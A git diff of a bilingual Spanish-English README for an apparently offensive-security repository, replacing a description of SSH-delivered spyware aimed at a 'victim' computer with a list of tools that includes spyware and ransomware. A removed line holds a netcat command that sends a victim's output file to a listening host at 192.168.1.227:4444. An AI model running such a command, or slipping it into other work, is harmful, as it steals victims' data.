@@ -1,6 +1,10 @@
-# Spyware---Offensive-Security
-Spyware de ejecución remota a una computadora víctima por SSH.
+Repositorio con multiples herramientas de ciberseguridad.
+Repository with multiple cybersecurity tools.
 
-Especificar los datos de la computadora receptora de los datos de la victima en:
+Programas: 
 
-nc 192.168.1.227 4444 < "$archivo_salida"
+- Spyware
+- Dictionary Attack
+- Network Sweep
+- Port Scanner
+- Ransomware
